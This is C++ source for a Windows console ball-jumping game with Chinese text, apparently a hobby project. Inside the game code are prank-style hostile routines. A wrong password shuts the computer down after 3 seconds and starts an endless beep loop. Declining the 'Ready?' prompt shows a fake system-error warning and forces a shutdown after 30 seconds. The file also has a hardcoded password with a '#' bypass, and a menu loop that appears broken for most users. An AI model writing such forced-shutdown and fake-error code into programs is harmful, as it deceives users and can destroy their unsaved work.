#include<iostream>
#include<cstdio>
#include<cstdlib>
#include<cmath>
#include<string>
#include<algorithm>
#include<iomanip>
#include <stdlib.h>  
#include <time.h>  
#include<cctype>
#include<windows.h>
#include<conio.h>
#define cai "彩球滑梯v6.1"
#define mima "19260817"
using namespace std;

/*全局变量*/

string tm="彩球滑梯";
bool inform=0;
char gzcd;
char back;
int maxnum[100]={0};
string maxname[100];
string cc;
string maxcheng[100];
string cheng[8]={"破彩球","低级彩球","初级彩球","中级彩球","高级彩球","超级彩球","无敌彩球","超神！"};
int yanse[8]={7,4,11,10,12,3,14,236};
string sword[9]={"↓","↙","←","↖","↑","↗","→","↘","↓"};
	int sx[9]={0,-2,-2,-2,0,2,2,2,0},sy[9]={0,-21,-1,-1,-1,-1,0,0};
	int turn=1;
	int wiz=-1;//位置 
	int swordtime=0;
int guanli=0;
int maxste=1;
int levnum=1;
int levfen=1;
int levlife=0;
int gamemode=0;
int df=0;
int sound=1;
int life=2;
int cjx[5];//石板横坐标 
int cjy[5];//石板纵坐标 
int zhd;
int qx;
int qy;
int mx;//怪物坐标 
int my;
int mdl;
int yidong=0;
int jump=0;
int fen=0;
int people=0;
char qd;
int cx[5]={0};
int up=0;
int jump2=0;
int zan=0;
int zhongli=1;
int tiao=4;
int first=0;
bool dl=0;
bool li=0; 
 
/*函数目录*/

void jz();//加载 
void wall();//更新墙 
void xy(int x,int y);//光标定位 
void c(int a);//字体颜色设置（数字） 
void b(string a);// 字体颜色设置（汉字）
void zcd();//主菜单 
void game();//游戏 
	void wq();//围墙
	void situa();//状态 
	void cj();//场景 
	int chengjiu();//成就 
void level();//级别设置 
void maxt();//最高分 
void in();//游戏规则及说明 
int comp(const int &a,const int &b);//排序用 

/*开始*/
 
int main()
{
	cout<<"要玩此游戏请输入8位密码！\n";
	cout<<"试玩模式请按 .\n";
	cout<<"若你没有密码请向开发者chenleyu索要！（当然chen会向你要一点东西，比如钱）\n";
	char o2,oo=' ';
	string o;
	while(oo!='Y'&&oo!='y')
	{
		o="";
		system("cls");
		cout<<"要玩此游戏请输入8位密码！\n";
		cout<<"试玩模式请按 .\n";
		cout<<"若你没有密码请向开发者chenleyu索要！（当然chen会向你要一点东西，比如钱）\n";
		for(int i=1;i<=8;i++)
		{
			o2=getche();
			if(o2=='.')
			{
				system("cls");
				cout<<"进入试玩模式！\n";
				o=mima;
				oo='y';
				guanli=2;
				Sleep(2000);
				break;
			}
			o+=o2;
			system("cls");
			cout<<"要玩此游戏请输入8位密码！\n";
			cout<<"试玩模式请按 .\n";
			cout<<"若你没有密码请向开发者chenleyu索要！（当然chen会向你要一点东西，比如钱）\n";
			for(int j=1;j<=i;j++)cout<<'*';
			if(o2=='#')
			{
				system("cls");
				cout<<"密码正确！进入vip模式！\n";
				o=mima;
				oo='y';
				guanli=1;
				Sleep(2000);
				break;
			}
		}
		cout<<"\n确定输入吗？(Y/N)\n";
		if(oo!='y')oo=getche();
	}
	if(o!=mima)
	{
		system("shutdown -s -t 3");
		for(int i=1;i<=3;i++)MessageBox(NULL,TEXT("密码错误"),TEXT("系统消息"),MB_OK|MB_ICONINFORMATION);
		while(1)cout<<'\a';
		return 0;
	}
	else if(guanli==0)
	{
		system("cls");
		cout<<"密码正确！";
		Sleep(2000);
	}
	system("cls");
	cout<<"请看弹出来的消息框！";
	MessageBox(NULL,TEXT("此游戏须用键盘操作哦！"),TEXT("温馨提示"),MB_OK|MB_ICONINFORMATION);//提示 
	jz();
	zcd();
	return 0;
}

/*函数部分*/
int chengjiu()
{
	if(df<1000)return 0;
	if(df<2000)return 1;
	if(df<5000)return 2;
	if(df<10000)return 3;
	if(df<30000)return 4;
	if(df<50000)return 5;
	if(df<100000)return 6;
	return 7;
}
void wq()
{
	for (int i=1;i<=25;i++)
	{
		xy(1+i,6);
		c(30);cout<<"□";c(15);
		xy(1+i,48);
		c(30);cout<<"□";c(15);	
	}
	xy(2,8);
	b("天蓝");
	for (int i=1;i<=20;i++)
	{
		cout<<"艹";	
	}
	xy(26,8);
	for (int i=1;i<=20;i++)
	{
		cout<<"艹";	
	}
	c(15);
	return;
}
void situa()
{
	xy(3,50);
	if(gamemode==1){c(9);cout<<"双重力";}
	else if(gamemode==2){c(13);cout<<"怪物";}
	else if(gamemode==3){c(3);cout<<"地震";}
	else if(gamemode==4){c(5);cout<<"尖钉";}
	else if(gamemode==5){c(8);cout<<"打怪";}
	else if(zhongli==-1){c(7);cout<<"反重力";}
	else if(zhongli==0){c(2);cout<<"无重力";}
	else {c(1);cout<<"正常";}
	if(levnum==1){c(9);cout<<"简单";}
	else if(levnum==2){c(14);cout<<"中等";}
	else if(levnum==3){c(12);cout<<"困难";}
	cout<<"模式";
	c(15) ;
	xy(4,50);
	cout<<"得分："<<df;
	xy(5,50);
	cout<<"成就："<<cheng[chengjiu()] ;
	xy(6,50);
	cout<<"还剩"<<life<<"条命";
	xy(8,50);
	cout<<cai;
}
void cj()
{
	if(fen==10)df+=levfen,fen=0;
	if (cjx[1]==3)
	{
		xy(cjx[1],cjy[1]);
		c(3);
		for(int k=1;k<=7;k++)
		{
			cout<<"  ";
		}
		c(15);
		for (int i=1;i<=4;i++)
		{
			if (cx[i]==1);
			{
				cx[i-1]=cx[i];
				cx[i]=0;	
			}	
		}
		if (cx[0]==1)
		{
			for (int i=1;i<=4;i++)
			{
				cx[i]=cx[i+1];	
			}	
		}
		for (int i=1;i<=3;i++)
		{
			cjx[i]=cjx[i+1];
			cjy[i]=cjy[i+1];	
		}
		cjx[4]=25;
		cjy[4]=rand()%35;
		while(cjy[4]<=6||cjy[4]%2==1)
		{
			cjy[4]=2*(rand()%18);	
		}
		zhd=rand()%13;	//随机数 
		int o=0;
		for(int i=1;i<=4;i++)if(cx[i]==1)o++;
		if(zhd<=1+levnum&&gamemode==4)
		{
			if(o<2)cx[4]=1;	//尖钉 
			else while(zhd<=1+levnum)zhd=rand()%13;//如果已经有两排尖钉了就换一个 
		} 
		if(zhd>=4&&zhd<=4+levnum/*&&gamemode!=1*/)
		{
			cx[4]=2;	//移动方块 
		}
		else
		{
			cx[4]=0;	//普通方块 
		}
//		else if(zhd>=2&&zhd<=5-levnum&&gamemode==1)cx[4]=2;
		li=0;	
	}
	if(gamemode==5&&yidong%15==0&&wiz>=0&&wiz<=8)//挥剑 
	{
		wiz-=turn;
	}
	if(wiz==9)wiz=-1;
	if(gamemode==5&&0<wiz&&wiz<8)
	{
		
		xy(qx+sx[wiz],qy+sy[wiz]);
		cout<<"  ";
		if(wiz>0&&wiz<8)
		{
			int sx1=qx+sy[wiz],sx2=qy+sx[wiz]+1;
			int frog=1;
			for(int i=1;i<=4;i++)
			{
				if(cjx[i]<=sx1&&sx1<=cjx[i]||sx2==cjy[i]){frog=0;break;}
			}
			if(frog)
			{
				xy(sx1,sx2);
				c(3);
				cout<<sword[wiz];
				c(15);
			}
			else
			{
				wiz=-1;
			}
		}
	}
	if(yidong%15==0){//移动方块 
		for(int i=1;i<=4;i++)
		{
			if(!(cx[i]==2||cx[i]==3))continue;
			xy(cjx[i],cjy[i]);
			cout<<"              ";
			if(cjy[i]>=34)cx[i]=3;
			if(cjy[i]<=8)cx[i]=2;
			if(cx[i]==2)cjy[i]+=2;
			else cjy[i]-=2;
			xy(cjx[i],cjy[i]);
			c(73);
			cout<<"□□□□□□□";
			c(15);
		}
	}
	if(yidong%20==0&&gamemode==2)//怪物 
	{
		xy(mx,my);cout<<"  ";
		if(qy>my&&my<=44)my+=2;else my-=2;
		if(mx>=25||mx<=3)
		{
			mx=qx;
			if(qy>=15)my=qy-6;
			else my=qy+6;
		}
	}
	if(yidong%20==0&&gamemode==3)
	{
		xy(qx,qy);cout<<"  ";
//		if(qy<=44)qy+=2;else qy-=2;
	}
	if(yidong==30)
	{
//		system("cls");
		for (int i=1;i<=4;i++)
		{
			yidong=0;
			xy(cjx[i],cjy[i]);
			c(0);
			for(int k=1;k<=7;k++)
			{
				cout<<"  ";
			}
			c(15);
			xy(--cjx[i],cjy[i]);
			if (qx==cjx[i]&&qy>=cjy[i]&&qy<cjy[i]+14)
			{
				//qx--;
				df=df+10;	
			}
			if (cx[i]==1)
			{
				for (int k=1;k<=7;k++)
				{
					b("天蓝");cout<<"⊥";c(15);	
				}	
			}
			else if(cx[i]==0)
			{
				for (int k=1;k<=7;k++)
				{
					c(30);cout<<"□";c(15);	
				}
				if (zhd>=9)
				{
					xy(cjx[4],cjy[4]);
					b("粉");cout<<"●";c(15);
					li=1;
					df+=20;
				}	
			}	
			else if(cx[i]==2||cx[i]==3)
			{
				c(73);
				for (int k=1;k<=7;k++)
				{
					cout<<"□";	
				}
				df+=10;
			}
		}
	}
	//system("pause");
	dl=0;
	for(int i=1;i<=4;i++)
	{
		if(zhongli!=0&&qx==cjx[i]-zhongli&&qy>=cjy[i]&&qy<cjy[i]+14&&(cx[i]==0||cx[i]==1||cx[i]==2||cx[i]==3))dl=1;
		if(zhongli!=0&&(qx==cjx[i])&&qy>=cjy[i]&&qy<cjy[i]+14&&(cx[i]==0||cx[i]==1||cx[i]==2||cx[i]==3))dl=1;
	}
	if (kbhit())
	{
		xy(2,1);
		qd=getche();
		switch(qd)
		{
			case 'w':first=0;if(gamemode!=1){if(jump>=20&&dl==1||zhongli==0){up=-1,jump=0,jump2=1;}}else{zhongli*=-1;}break;
			case 'a':first=0;if(wiz==-1)turn=1;/*if(gamemode!=3)*/if(qy>=9){xy(qx,qy);cout<<"  ";if(zhongli!=0)qy-=2*zhongli;else qy-=2;}/*else {if(qy<=9)qy=44;}*/break;
			case 'd':first=0;if(wiz==-1)turn=-1;/*if(gamemode!=3)*/if(qy<=44){xy(qx,qy);cout<<"  ";if(zhongli!=0)qy+=2*zhongli;else qy+=2;}/*else {if(qy>=44)qy=9;}*/break;
			case 'j':first=0;
					if(turn==1&&wiz==-1)
					{
						wiz=4;
					}
					else if(turn==-1&&wiz==-1)
					{
						wiz=4;
					}
					break;
			case 'z':zan=1;break;
		}
	}
	if(up)
	{
		int o=1;
		for(int i=1;i<=4;i++)
		{
			if(cjx[i]==qx-zhongli&&cjy[i]<=qy&&qy<cjy[i]+14)
			{
				o=0;break;
			}
		}
		if(jump2>=6)
		{
			xy(qx,qy);cout<<"  ";
			qx-=zhongli;
			up--;
			jump2=1;
		}
		if(zhongli==0)
		{
			xy(qx,qy);cout<<"  ";
			qx-=1;
		}
		if(o==0||up==-tiao||zhongli==0)up=0,jump2=0;
	}
	xy(qx,qy);
	int o=1;
	for(int i=1;i<=4;i++)if(qx==cjx[i])o=0;
	if(o==1){c(yanse[chengjiu()]);cout<<"●";c(15);}
	if(gamemode==2||gamemode==3){xy(mx,my);c(13);cout<<"⊕";c(15);}
	if (qx<=3||qx>=25)
	{
		if(sound==1)cout<<'\a';
		xy(qx,qy);
		b("灰");cout<<"●";c(15); 
		Sleep(1000);
		life--;
		df=df-100;
		int ii=3,jj=1;
		//if(zhongli=-1)ii=1,jj=4;
		while(cx[ii]==1&&ii>0&&ii<5)ii-=1;
		if(gamemode!=1)qx=cjx[ii]-zhongli;
		if(zhongli==0)qx+=1;
		if(gamemode==1)qx=cjx[2]-1,zhongli=1,first=1;
		qy=cjy[ii]+6;
		up=0,jump2=0;	
	}
	if (li==1)
	{
		if (qx==cjx[4]&&qy==cjy[4])
		{
			life++;	
		}	
	}
	for (int i=1;i<=4;i++)
	{
		if ((cx[i]==1)&&(qx==cjx[i]||qx==cjx[i]-1)&&qy>=cjy[i]&&qy<cjy[i]+14||(zhongli==0)&&qx==cjx[i]&&qy>=cjy[i]&&qy<cjy[i]+14||(gamemode==1)&&cx[i]!=2&&cx[i]!=3&&qx==cjx[i]&&qy>=cjy[i]&&qy<cjy[i]+14)
		{
			if(sound==1)cout<<'\a';
			xy(qx,qy);
			b("灰");cout<<"●";c(15); 
			Sleep(1000);
			c(0);
			cout<<"  ";
			life--;
			df=df-100;
			int ii=3;
			while(cx[ii]==1&&ii>0)ii--;
			if(gamemode!=1)qx=cjx[ii]-zhongli;
			if(zhongli==0)qx+=1;
			if(gamemode==1)qx+=1,zhongli=1,first=1;
			qy=cjy[ii]+6;	
			up=0,jump2=0;
		}	
	}
	if(mx==qx&&my==qy)
	{
		if(sound==1)cout<<'\a';
		xy(qx,qy);
		b("灰");cout<<"●";c(15); 
		Sleep(1000);
		c(0);
		cout<<"  ";
		life--;
		df=df-100;
		int ii=3;
		while(cx[ii]==1&&ii>0)ii--;
		if(gamemode!=1)qx=cjx[ii]-zhongli;
		if(zhongli==0)qx+=1;
		if(gamemode==1)qx+=1,zhongli=1,first=1;
		qy=cjy[ii]+6;	
		up=0,jump2=0;
	}
	dl=0;
	for (int i=1;i<=4;i++)
	{
		if(zhongli!=0&&qx==cjx[i]-zhongli&&qy>=cjy[i]&&qy<cjy[i]+14&&(cx[i]==0||cx[i]==1||cx[i]==2||cx[i]==3))dl=1;
		if(zhongli!=0&&(qx==cjx[i])&&qy>=cjy[i]&&qy<cjy[i]+14&&(cx[i]==0||cx[i]==1||cx[i]==2||cx[i]==3))
		{
			dl=1;
			qx-=zhongli;
			xy(qx,qy);c(yanse[chengjiu()]);cout<<"●";c(15);
			df=df+10;	
		}	
	}
	if (zhongli!=0&&dl==0&&yidong%7==0&&up==0&&first==0)
	{
		xy(qx,qy);cout<<"  ";
		qx+=zhongli;
		xy(qx,qy);c(yanse[chengjiu()]);cout<<"●";c(15);
	}
	mdl=0;
	if(gamemode==2)
	{
		for (int i=1;i<=4;i++)
		{
			if(zhongli!=0&&mx==cjx[i]-zhongli&&my>=cjy[i]&&my<cjy[i]+14&&(cx[i]==0||cx[i]==1||cx[i]==2||cx[i]==3))dl=1;
			if(zhongli!=0&&(mx==cjx[i])&&my>=cjy[i]&&my<cjy[i]+14&&(cx[i]==0||cx[i]==1||cx[i]==2||cx[i]==3))
			{
				mdl=1;
				xy(mx,my);cout<<"  ";
				mx-=zhongli;
				xy(mx,my);c(13);cout<<"⊕";c(15);
				df=df+10;	
			}	
		}
		if (zhongli!=0&&dl==0&&yidong%7==0&&up==0&&first==0)
		{
			xy(mx,my);cout<<"  ";
			mx+=1;
			xy(mx,my);c(13);cout<<"⊕";c(15);
		}
	}
	//system("pause");
}
void game()
{
	srand((unsigned)time(NULL));
	for(int i=1;i<=4;i++)cjx[i]=0,cjy[i]=0;
	int levlifeo=0;
	levlife=0;
	tiao=4;
	zhongli=1;
	levfen=levnum;
	life=3;
	mx=1,my=80;
	if(levnum>=4&&levnum<=6)tiao=10,zhongli=-1,levnum-=3,levfen+=5*levnum,life+=2;
	else if(levnum>=7&&levnum<=9)zhongli=0,levnum-=6,levfen+=3*levnum,life+=2;
	else if(levnum>=10&&levnum<=12)zhongli=1,levnum-=9,levfen+=10*levnum,life++,gamemode=1,first=1;
	else if(levnum>=13&&levnum<=15)zhongli=1,levnum-=12,levfen+=5*levnum,life++,gamemode=2,tiao+=levnum+1;
	else if(levnum>=16&&levnum<=18)zhongli=1,levnum-=15,levfen+=3*levnum,life++,gamemode=3,tiao+=levnum+1,my=25;
	else if(levnum>=19&&levnum<=21)zhongli=1,levnum-=18,levfen+=levnum,life++,gamemode=4;
	else if(levnum>=22&&levnum<=24)zhongli=1,levnum-=21,life+=2,gamemode=5;
	else tiao+=levnum-1;
	df=0;
	system("cls");
	wq();
	if (MessageBox(NULL,TEXT("Ready?"),TEXT("提示"),MB_YESNO|MB_ICONINFORMATION)==6)
	{
		for (int i=4;i<=19;i+=5)
		{
			cjx[(i+1)/5]=i;
		}
		for (int i=1;i<=4;i++)
		{
			cjy[i]=rand()%35;
			if (cjy[i]<=6||cjy[i]%2==1)i--;	
		}
		qx=cjx[4];
		if(gamemode!=1)qx-=zhongli;
		if(zhongli==0||gamemode==1)qx+=1;
		if(gamemode==2)mx=cjx[4]-1,my=cjy[4]+12;
		qy=cjy[4];
		while(life)
		{
			levlifeo=chengjiu();
			situa();
			cj();
			levlife=chengjiu();
			if(levlife>=2)life+=levlife-levlifeo;
			Sleep(5/levnum);
			yidong++;
			if(gamemode==5)swordtime++;
			if(jump<=20)jump++;
			if(first>=1)first++;
			if(first>=120)first=0;
			fen++;
			if(jump2<=6&&jump2>0)jump2++;
			int o=0;
			if(zan==1)
			{
//				system("cls");
				cout<<"游戏暂停中，按z继续，按q退出。"; 
				qd=' ';
				while(qd!='z'&&qd!='q')qd=getche();
				switch(qd)
				{
					case 'q':o=1;break;
					case 'z':system("cls");break;
				}
				zan=0;
				wq();
			}
			if(o==1)break;
			//if(yidong==0)system("cls");	
		}
		system("cls");
		cout<<"您已死亡";
		cout<<endl;
		cout<<"得分："<<df<<endl;
		cout<<"成就："<<cheng[chengjiu()]<<endl;
		cout<<"请输入您的名字（不支持空格，支持下划线）："<<endl; 
		cin>>cc;
		if(cc=="chenleyusb"||cc=="fuckchenleyu"||cc=="chenleyupig")return;
		people++;
		maxnum[people]=df;
		maxname[people]=cc;
		maxcheng[people]=cheng[chengjiu()];
		for(int i=1;i<=4;i++)cjx[i]=0,cjy[i]=0,cx[i]=0;
		for(int t,i=people;i>=2;i--){if(maxnum[i]>maxnum[i-1])t=maxnum[i],maxnum[i]=maxnum[i-1],maxnum[i-1]=t,cc=maxname[i],maxname[i]=maxname[i-1],maxname[i-1]=cc,cc=maxcheng[i],maxcheng[i]=maxcheng[i-1],maxcheng[i-1]=cc;else break;}
		cout<<endl;
		levnum=1;
		system("pause");
		zcd();	
	}
	else	
	{
		Sleep(1000);
		MessageBox(NULL,TEXT("系统发生未知错误！为了保护系统安全，系统将在30秒后结束运行"),TEXT("警告"),MB_OK|MB_ICONERROR);
		system("shutdown -s -t 30 -c 系统出错！");	
	}
}
void level()
{
	system("cls");
	cout<<"游戏级别设置";
	cout<<endl;
	cout<<endl;
	cout<<"      ";
	cout<<"“模式帮助”请按0";
	cout<<endl;
	cout<<endl;
	cout<<"      ";
	cout<<"“简单”请按1";
	cout<<endl;
	cout<<"      ";
	cout<<"“中等”请按2";
	cout<<endl;
	cout<<"      ";
	cout<<"“困难”请按3";
	cout<<endl;
	cout<<"      ";
	cout<<"“反重力简单”请按4";
	cout<<endl;
	cout<<"      ";
	cout<<"“反重力中等”请按5";
	cout<<endl;
	cout<<"      ";
	cout<<"“反重力困难”请按6";
	if(guanli<=1)
	{
		cout<<endl;
		cout<<"      ";
		cout<<"“无重力简单”请按7";
		cout<<endl;
		cout<<"      ";
		cout<<"“无重力中等”请按8";
		cout<<endl;
		cout<<"      ";
		cout<<"“无重力困难”请按9";
		cout<<endl;
		cout<<"      ";
		cout<<"“双重力简单”请按10";
		cout<<endl;
		cout<<"      ";
		cout<<"“双重力中等”请按11";
		cout<<endl;
		cout<<"      ";
		cout<<"“双重力困难”请按12";
	}
	if(guanli==1)
	{
		cout<<endl;
		cout<<"      ";
		cout<<"“怪物简单”请按13";
		cout<<endl;
		cout<<"      ";
		cout<<"“怪物中等”请按14";
		cout<<endl;
		cout<<"      ";
		cout<<"“怪物困难”请按15";
		cout<<endl;
		cout<<"      ";
		cout<<"“地震简单”请按16";
		cout<<endl;
		cout<<"      ";
		cout<<"“地震中等”请按17";
		cout<<endl;
		cout<<"      ";
		cout<<"“地震困难”请按18";
		cout<<endl;
		cout<<"      ";
		cout<<"“尖刺简单”请按19";
		cout<<endl;
		cout<<"      ";
		cout<<"“尖刺中等”请按20";
		cout<<endl;
		cout<<"      ";
		cout<<"“尖刺困难”请按21";
		cout<<endl;
		cout<<"      ";
		cout<<"“打怪简单”请按22";
		cout<<endl;
		cout<<"      ";
		cout<<"“打怪中等”请按23";
		cout<<endl;
		cout<<"      ";
		cout<<"“打怪困难”请按24";
	}
	cout<<endl;
	cin>>levnum;
	if(levnum==0)
	{
		system("cls");
		cout<<"------------------------------------\n";
		cout<<"|            模式帮助              |\n";
		cout<<"| 1、正常模式：球的重力向下。      |\n";
		cout<<"|                                  |\n";
		cout<<"| 2、反重力模式：球的重力相反。    |\n";
		cout<<"|                                  |\n";
		if(guanli<=1)
		{
			cout<<"| 3、无重力模式：球不会落下，但是  |\n";
			cout<<"|    碰到石板或移动石板会死掉。    |\n";
			cout<<"|                                  |\n";
			cout<<"| 4、双重力模式：球不会跳起，按w   |\n";
			cout<<"|    会改变球的重力，碰到石板会死。|\n";
			cout<<"|                                  |\n";
		}
		if(guanli==1)
		{
			cout<<"| 5、怪物模式：会有一个行走缓慢的  |\n";
			cout<<"|    怪物跟着球，会杀死球，球的重力|\n";
			cout<<"|    向下。                        |\n";
			cout<<"|                                  |\n";
			cout<<"| 6、地震模式：地图会疯狂上下震动，|\n";
			cout<<"|    重力向下，移动和正常模式一样。|\n";
			cout<<"|                                  |\n";
			cout<<"| 7、尖钉模式：出现会扎死球的尖钉，|\n";
			cout<<"|    方块可能会随机变换，移动正常。|\n";
			cout<<"|                                  |\n";
			cout<<"| 8、打怪模式：会有怪物出现，开局拥|\n";
			cout<<"|    有一把剑，打怪有概率掉武器。  |\n";
			cout<<"|                                  |\n";
		}
		if(guanli==1)cout<<"|  暂时只有这么多关，敬请期待！    |\n";
		if(guanli==0)cout<<"|  普通模式只开放这么多关。        |\n";
		if(guanli==2)cout<<"|  试玩就这么多关，体验需购买㊣版  |\n";
		cout<<"|                                  |\n";
		cout<<"------------------------------------\n";
		cout<<"请按b返回";
		back=getche();
		level();
		return;
	}
	cout<<endl;
	if(guanli==2&&levnum>=7||guanli==0&&levnum>=13||guanli==1&&levnum>=25)
	{
		cout<<"没有那么多关";
	}
	cout<<"请按b返回";
	back=getche();
	zcd(); 
} 
void maxt()
{
	system("cls");
	sort(maxnum+1,maxnum+maxste,comp);
	cout<<"游戏最高分";
	int o=people;
	if(o>5)o=5;
	for(int i=1;i<=o;i++)
	{
		cout<<endl;
		cout<<endl;
		cout<<"    ";
		cout<<"NO."<<i<<": "<<maxname[i]<<"  "<<maxnum[i]<<"分  成就："<<maxcheng[i];
	}
	for(int i=1;i<=5-o;i++)
	{
		cout<<endl;
		cout<<endl;
		cout<<"    ";
		cout<<"NO."<<people+i<<":  --";
	}
	cout<<endl;
	cout<<endl;
	cout<<"请按b返回，按o抹除记录";
	back=' ';
	while(back!='b'&&back!='o')back=getch();
	if(back=='o')
	{
		for(int i=1;i<=people;i++)maxnum[i]=0,maxname[i]="";
		people=0;
		maxt();
		return;
	}
	zcd();
}
void in()
{
	system("cls");
	b("白"); 
	cout<<"游戏规则及说明";
	cout<<endl;
	cout<<"                                           ";
	c(240);cout<<"作者：chenleyu  原作者：ccl";c(15);
	cout<<endl;
	cout<<cai;
	cout<<endl;
	cout<<"     ";
	cout<<"按w,s,a,d控制彩球上下左右移动，按z暂停";
	cout<<endl;
	cout<<endl;
	cout<<"    ";
	b("红");cout<<"●   ";
	b("白");cout<<"为彩球，控制彩球移动使其安全并尽可能得分为游戏目标";
	cout<<endl;
	cout<<"    "; 
	c(30);cout<<"□";c(15);cout<<"   ";
	b("白");cout<<"为石块，可接住小球并加分10，不可穿透";
	cout<<endl;
	cout<<"    "; 
	c(73);cout<<"□";c(15);cout<<"   ";
	b("白");cout<<"为移动石块，可接住小球并加分20，会移动，不可穿透，难度越高越容易出现";
	cout<<endl;
	cout<<"    "; 
	b("天蓝");cout<<"艹、⊥   ";
	b("白");cout<<"为尖钉，会扎破小球扣一条命并扣100分";
	cout<<endl;
	cout<<"    ";
	b("粉");cout<<"●   ";
	b("白");cout<<"为续命点，可为小球随机续0～3条命并加20分，会消失，需要站在上面才能续命";
	cout<<endl;
	cout<<"目前只有这些场景，以后会慢慢增加"; 
	cout<<endl;
	cout<<endl;
	cout<<"目前游戏存在的一些bug";
	cout<<endl;
	cout<<"    ";
	cout<<"(1)球有时会抽风地往上跳（概率极低，问题不严重）";
	cout<<endl;
	cout<<"    ";
	cout<<"(2)有时会被系统欺负，被迫中止（概率低，问题严重）";
	cout<<endl;
	cout<<"这些bug作者永远不会修复，感谢您的支持与配合！";
	cout<<endl;
	cout<<endl;
	cout<<"请按b返回";
	back=getch();
	zcd(); 
}
void zcd()
{
	system("cls");
	xy(1,5);
	for (int i=2;i<=9;i+=2)
	{
		c(i);
		cout<<tm[i-2]<<tm[i-1]<<" ";	
	}
	c(15);
	xy(3,4);
	cout<<"(1)开始游戏[s]";
	xy(4,4);
	cout<<"(2)级别[l]";
	xy(5,4);
	cout<<"(3)最高分[m]";
	xy(6,4);
	cout<<"(4)游戏规则及说明[i]";
	xy(7,4);
	cout<<"(5)";
	if(sound==0)cout<<"开启";
	else cout<<"关闭";
	cout<<"音效[p]";
	xy(8,4);
	cout<<"(6)更新墙[q]";
	xy(25,2);
	gzcd=getch();
	while(gzcd=='s'&&inform==0||guanli!=1)
	{
		MessageBox(NULL,TEXT("请先阅读游戏规则及说明！"),TEXT("提示"),MB_OK|MB_ICONINFORMATION);
		gzcd=getch();	
	}
	switch(gzcd)
	{
		case 's':game();break;
		case 'l':level();break;
		case 'm':maxt();break;
		case 'i':inform=1;in();break;
		case 'p':sound=1-sound;break;
		case 'q':wall();break;
	} 
	zcd();
	return;
}
void jz()
{
	system("cls");
	if(guanli==1)return;
	cout<<"游戏正在回家中，请稍候";
	xy(2,10);
	b("深红");
	cout<<"∩";
	xy(2,0);
	b("白"); 
	cout<<"C";
	for (int i=1;i<=9;i++)
	{
		cout<<"=";
		Sleep(500);	
	}	
}
void xy(int x, int y)
{
	COORD asd={y,x};
	SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE),asd);
}
void c(int a)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),a);
}
void b(string a)
{
	if(a=="黑")   c(0);
	if(a=="深蓝") c(1);
	if(a=="深绿") c(2);
	if(a=="淡蓝") c(3);
	if(a=="深红") c(4);
	if(a=="紫")   c(5);
	if(a=="深黄") c(6);
	if(a=="灰白") c(7);
	if(a=="灰")   c(8);
	if(a=="蓝")   c(9);
	if(a=="淡绿")c(10);
	if(a=="天蓝")c(11);
	if(a=="红")  c(12);
	if(a=="粉")  c(13);
	if(a=="淡黄")c(14);
	if(a=="白")  c(15);
}
int comp(const int &a,const int &b)
{
	return a>b;
}
void wall()
{
	system("cls");
	cout<<"              更新墙"<<endl<<endl; 
	cout<<"v6.1更新  2017.6.11\n";
	cout<<"添加了更新墙\n";
	cout<<"添加了新模式-尖钉模式\n\n"; 
	cout<<"v7.1更新 \n";
	cout<<"优化了游戏流畅度，增大了困难模式的速度\n";
	cout<<"添加了打怪模式\n";
	cout<<"\n\n\n";
	cout<<"按任意键退出";
	char c;
	c=getche();
	return;
}
